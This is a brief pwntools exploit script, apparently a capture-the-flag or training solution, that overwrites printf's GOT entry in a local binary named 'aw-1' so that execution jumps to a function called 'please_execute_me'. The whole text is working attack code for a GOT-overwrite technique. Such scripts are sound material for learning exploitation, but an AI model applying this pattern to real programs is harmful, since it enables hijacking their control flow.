#!/usr/bin/env python
from pwn import *

p = process('./aw-1')

p.sendline('8')

got_of_printf = p.elf.got['printf']
print("Got of printf %s" % hex(got_of_printf))
p.sendline(hex(got_of_printf))

addr_of_pem = p.elf.symbols['please_execute_me']
print("addr of please_execute_me %s" % hex(addr_of_pem))
p.send(p64(addr_of_pem))

p.interactive()
